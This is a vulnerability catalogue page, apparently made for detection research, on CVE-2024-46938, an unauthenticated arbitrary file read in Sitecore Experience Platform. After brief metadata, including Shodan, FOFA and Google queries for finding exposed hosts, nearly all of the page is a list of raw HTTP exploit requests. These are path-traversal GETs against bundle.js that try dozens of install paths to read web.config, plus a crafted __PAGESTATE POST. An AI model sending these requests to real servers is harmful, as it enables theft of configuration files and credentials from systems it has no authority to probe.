---
layout: post
cve_id: CVE-2024-46938
title: Sitecore Experience Platform <= 10.4 - Arbitrary File Read
pcap: true
pcap_path: /pcaps/2024/CVE-2024-46938.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-46938.yaml
snort2_rule: N/A
snort3_rule: N/A
author: DhiyaneshDK
severity: high
impact: 'Unauthenticated attackers can read arbitrary files from the Sitecore server,
  potentially exposing sensitive configuration and credentials.

  '
remediation: 'Update Sitecore Experience Platform to a version that patches CVE-2024-46938.

  '
reference:
- https://www.assetnote.io/resources/research/leveraging-an-order-of-operations-bug-to-achieve-rce-in-sitecore-8-x---10-x
- https://nvd.nist.gov/vuln/detail/CVE-2024-46938
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
  cvss-score: 7.5
  cve-id: CVE-2024-46938
  epss-score: 0.93306
  epss-percentile: 0.99797
  cpe: cpe:2.3:a:sitecore:experience_commerce:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 45
  vendor: sitecore
  product: experience_commerce
  shodan-query: http.title:"sitecore"
  fofa-query: title="sitecore"
  google-query: intitle:"sitecore"
tags:
- cve
- cve2024
- sitecore
- lfi
- rce
- vkev
- vuln
---

## ðŸ” Vulnerability Description
An issue was discovered in Sitecore Experience Platform (XP), Experience Manager (XM), and Experience Commerce (XC) 8.0 Initial Release through 10.4 Initial Release. An unauthenticated attacker can read arbitrary files.


## ðŸŒ HTTP Request
```nohighlight
GET /-/media/doo-doo.ashx HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Knoppix; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
POST /-/xaml/Sitecore.Shell.Applications.ContentEditor.Dialogs.EditHtml.ValidateXHtml?hdl=a HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Connection: close
Content-Length: 22
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
__PAGESTATE=/../../x/x
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\sxa\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\Sitecore82\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\sitecore\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\sitecore1\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\XP0.sc\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:70.0) Gecko/20100101 Firefox/70.0
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\Sitecore8\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\Sitecore75\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\Sitecore81u2\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\Sitecore7\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_10_3 rv:2.0; so-DJ) AppleWebKit/533.15.6 (KHTML, like Gecko) Version/4.0.2 Safari/533.15.6
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\Sitecore81\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0.1 Safari/605.1.15
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\Websites\spe.dev.local\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/604.1
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\Sitecore71\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\SitecoreSPE_8\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:141.0) Gecko/20100101 Firefox/141.0
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\Sitecore70\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\Sitecore72\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\SitecoreInstance\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\sitecore93sc.dev.local\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\SitecoreSPE_91\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\Sitecore9\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\sitecore9.sc\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (SS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\Sitecore81u3\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.7.20) Gecko/ Firefox/3.6.20
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\sitecore93.sc\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\sitecore901xp0.sc\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\sitecore9-website\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.7.20) Gecko/ Firefox/3.6.11
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\www.victim.com.sc\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\www.victim.com.sc\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\victim.com.sc\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\www.victim.com\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\victim.com\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.5.20) Gecko/ Firefox/10.0
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\www.victim.com\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\www.victim.com.sitecore\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; es-es) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\www.victim.com.sitecore\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; de-de) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.1 Safari/525.20
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\victim.com.sitecore\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14) AppleWebKit/620.32 (KHTML, like Gecko) Version/17.1.10 Safari/620.32
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\www.victim.com.website\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; it-it) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\www.victim.com.website\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\victim.com.website\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\www.victim.com.dev.local\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.5.20
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\www.victim.com.dev.local\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh, Intel Mac OS X 10.15, rv:140.0) Gecko/20100101 Firefox/140.0
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\victim.com.dev.local\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; en-US) Gecko/20010604 Firefox/109.0
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\www.victim.comsc.dev.local\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/118.0
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\www.victim.comsc.dev.local\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept-Encoding: gzip
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\victim.comsc.dev.local\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept-Encoding: gzip
```

